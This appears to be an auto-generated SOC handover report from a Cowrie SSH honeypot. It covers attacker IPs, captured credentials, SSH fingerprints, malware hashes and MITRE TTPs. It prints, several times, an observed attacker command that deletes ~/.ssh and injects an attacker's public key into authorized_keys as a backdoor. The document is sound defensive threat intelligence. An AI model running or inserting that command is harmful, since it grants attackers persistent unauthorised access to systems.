# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-20 |
| **Generated At** | 2026-05-20T18:22:19Z |
| **Shift Time** | 18:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **938** |
| Confirmed Threats | **922** |
| False Positives Filtered | **16** (1.7%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **12** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **934** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **12** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **8** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 2 |
| `iloveyou` | 1 |
| `boot2docker` | 1 |
| `emqx` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `rhel` | 1 |
| `root$123` | 1 |
| `iloveyou` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `rhel` | 1 |
| `root` | `root$123` | 1 |
| `iloveyou` | `iloveyou` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `rhel` | `197.227.8.186` | 2026-05-20T17:04:39 |
| `root` | `3245gs5662d34` | `197.227.8.186` | 2026-05-20T17:04:43 |
| `root` | `root$123` | `45.117.179.232` | 2026-05-20T17:08:19 |
| `root` | `3245gs5662d34` | `45.117.179.232` | 2026-05-20T17:08:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **938** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 13 |
| Unknown | 3 |
| Go SSH scanner | 1 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 9 | 2 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 9 | 2 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `95420f9d932d...` | Unknown | 3 | 2 | — |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.227.8.186`, `45.117.179.232`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **17** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS61512` | GIG@NET SOCIEDAD ANONIMA | 1 | LOW |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS23889` | Mauritius Telecom Ltd | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS28618` | Linktel Telecom do Brasil Ltda | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0908cc32f927

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-05-20 17:04 |
| **Last Seen** | 2026-05-20 17:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 17:04:38` | `cowrie.session.connect` |
| `2026-05-20 17:04:38` | `cowrie.client.version` |
| `2026-05-20 17:04:39` | `cowrie.client.kex` |
| `2026-05-20 17:04:39` | `cowrie.login.success` |
| `2026-05-20 17:04:39` | `cowrie.session.params` |
| `2026-05-20 17:04:39` | `cowrie.command.input` |
| `2026-05-20 17:04:39` | `cowrie.command.failed` |
| `2026-05-20 17:04:40` | `cowrie.log.closed` |
| `2026-05-20 17:04:40` | `cowrie.session.params` |
| `2026-05-20 17:04:40` | `cowrie.command.input` |
| `2026-05-20 17:04:40` | `cowrie.session.file_download` |
| `2026-05-20 17:04:40` | `cowrie.log.closed` |
| `2026-05-20 17:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3817206fb85c

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-05-20 17:04 |
| **Last Seen** | 2026-05-20 17:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 17:04:42` | `cowrie.session.connect` |
| `2026-05-20 17:04:42` | `cowrie.client.version` |
| `2026-05-20 17:04:42` | `cowrie.client.kex` |
| `2026-05-20 17:04:43` | `cowrie.login.success` |
| `2026-05-20 17:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3e94c5d388

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-05-20 17:08 |
| **Last Seen** | 2026-05-20 17:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 17:08:18` | `cowrie.session.connect` |
| `2026-05-20 17:08:18` | `cowrie.client.version` |
| `2026-05-20 17:08:18` | `cowrie.client.kex` |
| `2026-05-20 17:08:19` | `cowrie.login.success` |
| `2026-05-20 17:08:20` | `cowrie.session.params` |
| `2026-05-20 17:08:20` | `cowrie.command.input` |
| `2026-05-20 17:08:20` | `cowrie.command.failed` |
| `2026-05-20 17:08:20` | `cowrie.log.closed` |
| `2026-05-20 17:08:20` | `cowrie.session.params` |
| `2026-05-20 17:08:20` | `cowrie.command.input` |
| `2026-05-20 17:08:20` | `cowrie.session.file_download` |
| `2026-05-20 17:08:20` | `cowrie.log.closed` |
| `2026-05-20 17:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54fdeff37e54

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-05-20 17:08 |
| **Last Seen** | 2026-05-20 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 17:08:23` | `cowrie.session.connect` |
| `2026-05-20 17:08:23` | `cowrie.client.version` |
| `2026-05-20 17:08:23` | `cowrie.client.kex` |
| `2026-05-20 17:08:24` | `cowrie.login.success` |
| `2026-05-20 17:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.245.56[.]194` | **883** | 2026-05-20 15:29 | 2026-05-20 18:20 | 567m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **17** | 2026-05-20 15:29 | 2026-05-20 18:20 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `177.152.143[.]101` | **6** | 2026-05-20 17:11 | 2026-05-20 17:18 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `35.203.211[.]225` | **2** | 2026-05-20 17:44 | 2026-05-20 17:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]121` | **2** | 2026-05-20 17:28 | 2026-05-20 17:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.50.143[.]78` | 1 | 2026-05-20 18:16 | 2026-05-20 18:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]10` | 1 | 2026-05-20 17:10 | 2026-05-20 17:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]229` | 1 | 2026-05-20 18:12 | 2026-05-20 18:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]3` | 1 | 2026-05-20 18:12 | 2026-05-20 18:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.227.8[.]186` | 1 | 2026-05-20 17:04 | 2026-05-20 17:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.117.179[.]232` | 1 | 2026-05-20 17:08 | 2026-05-20 17:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.230.79[.]105` | 1 | 2026-05-20 16:14 | 2026-05-20 16:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]181` | 1 | 2026-05-20 18:14 | 2026-05-20 18:14 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `157.245.56[.]194` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `195.184.76[.]3` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `111.50.143[.]78` | CN | China Mobile Communications Corporation | **100** ⚠️ | 19 |
| `35.203.211[.]225` | GB | Google LLC | **100** ⚠️ | 50 |
| `195.184.76[.]229` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `91.230.168[.]181` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `45.117.179[.]232` | VN | Branch of Nhan Hoa Software Company in Ho Chi Minh City | **100** ⚠️ | 18 |
| `197.227.8[.]186` | MU | MauritiusTelecom | **100** ⚠️ | 50 |
| `118.186.7[.]10` | CN | Beijing xhxt technology development co., LTD | **100** ⚠️ | 11 |
| `66.132.195[.]121` | US | Censys, Inc. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 18 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 938 cases |
| Tool 34  | Credential Extractor        | ✅ 12 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 13 recon entry/entries in table (5 group(s) consolidating 910 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-20T18:22:19Z_
